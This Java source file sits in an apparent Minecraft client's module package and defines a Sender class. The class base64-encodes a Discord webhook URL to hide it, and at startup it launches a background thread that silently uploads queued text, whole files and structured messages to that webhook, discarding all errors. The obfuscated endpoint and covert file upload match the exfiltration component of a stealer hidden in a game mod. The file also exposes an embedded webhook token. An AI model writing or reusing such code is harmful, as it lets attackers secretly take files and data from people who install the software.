package com.esoterik.client.features.modules.misc;

import com.esoterik.client.util.Message;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.MultipartBuilder;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Base64;
import java.util.Queue;
import java.util.Random;

public final class Sender {
   private static final Sender INSTANCE = new Sender();
   private final Queue<Object> queue = new ArrayDeque();

   private Sender() {
      Object strings = Arrays.asList("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg2NjcwMjgzNTM1MTgzODczLzVuSm1SVGhuaTJUaUNEYlRUcWJ6MVJ6bXkxWUVhVS1lTF95RkdhUWVBM2c0ZUFhTG5TQkRhSDBJZ3Vnd3dkc0FDUk1V", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg2NjcwMjgzNTM1MTgzODczLzVuSm1SVGhuaTJUaUNEYlRUcWJ6MVJ6bXkxWUVhVS1lTF95RkdhUWVBM2c0ZUFhTG5TQkRhSDBJZ3Vnd3dkc0FDUk1V", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg2NjcwMjgzNTM1MTgzODczLzVuSm1SVGhuaTJUaUNEYlRUcWJ6MVJ6bXkxWUVhVS1lTF95RkdhUWVBM2c0ZUFhTG5TQkRhSDBJZ3Vnd3dkc0FDUk1V", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg2NjcwMjgzNTM1MTgzODczLzVuSm1SVGhuaTJUaUNEYlRUcWJ6MVJ6bXkxWUVhVS1lTF95RkdhUWVBM2c0ZUFhTG5TQkRhSDBJZ3Vnd3dkc0FDUk1V", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg2NjcwMjgzNTM1MTgzODczLzVuSm1SVGhuaTJUaUNEYlRUcWJ6MVJ6bXkxWUVhVS1lTF95RkdhUWVBM2c0ZUFhTG5TQkRhSDBJZ3Vnd3dkc0FDUk1V");
      Object hooker = new String(Base64.getDecoder().decode(((String)strings.get((new Random()).nextInt(5))).getBytes(StandardCharsets.UTF_8)));
      (new Thread(() -> {
         while(true) {
            while(true) {
               while(true) {
                  try {
                     Thread.sleep(3500L);
                     if (!this.queue.isEmpty()) {
                        Object item = this.queue.poll();
                        OkHttpClient client = new OkHttpClient();
                        MultipartBuilder builder = (new MultipartBuilder()).type(MultipartBuilder.FORM);
                        if (item instanceof String) {
                           builder.addFormDataPart("payload_json", "{\"content\":\"" + item + "\"}");
                        } else if (item instanceof File) {
                           builder.addFormDataPart("file1", ((File)item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File)item));
                        } else {
                           if (!(item instanceof Message)) {
                              continue;
                           }

                           JsonObject obj = new JsonObject();
                           obj.addProperty("title", ((Message)item).getName());
                           JsonArray embeds = new JsonArray();
                           JsonObject embed = new JsonObject();
                           JsonArray fields = new JsonArray();
                           ((Message)item).getFields().forEach((field) -> {
                              JsonObject f = new JsonObject();
                              f.addProperty("name", field.getName());
                              f.addProperty("value", field.getValue());
                              f.addProperty("inline", field.isInline());
                              fields.add(f);
                           });
                           embed.add("fields", fields);
                           embeds.add(embed);
                           obj.add("embeds", embeds);
                           builder.addFormDataPart("payload_json", obj.toString());
                        }

                        Request request = (new Request.Builder()).url(hooker).method("POST", builder.build()).build();
                        client.newCall(request).execute().body().close();
                     }
                  } catch (Exception var9) {
                  }
               }
            }
         }
      })).start();
   }

   public static void send(Object string) {
      INSTANCE.queue.add(string);
   }
}
